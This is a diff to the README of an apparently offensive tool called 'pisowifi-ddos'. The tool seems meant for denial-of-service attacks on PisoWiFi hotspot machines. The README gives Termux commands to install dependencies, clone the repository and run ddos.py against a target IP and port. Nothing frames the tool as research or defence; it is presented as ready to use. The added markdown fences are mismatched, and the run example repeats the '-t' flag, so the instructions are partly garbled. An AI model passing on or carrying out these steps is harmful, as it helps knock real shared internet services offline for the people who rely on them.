@@ -8,12 +8,27 @@
 # Requirements
 - Termux
 
-# Auto Install
+# Manual Install
 ```
-pkg update && pkg upgrade -y && pkg install git python python-pip -y && git clone https://github.com/xiv3r/pisowifi-ddos && cd pisowifi-ddos && python3 ddos.py
+pkg update && pkg upgrade -y
+```
+pkg install git python python-pip -y
+```
+git clone https://github.com/xiv3r/pisowifi-ddos.git
+```
+cd pisowifi-ddos
+```
+python3 ddos.py -h
 ```
 
+# Auto Install
+```
+pkg update && pkg upgrade -y && pkg install git python python-pip -y && git clone https://github.com/xiv3r/pisowifi-ddos.git && cd pisowifi-ddos && python ddos.py
+```
 # Run
+```
+cd pisowifi-ddos
+```
 ```
 python3 ddos.py -t 10.0.0.1 -p 80 -t 135
 ```
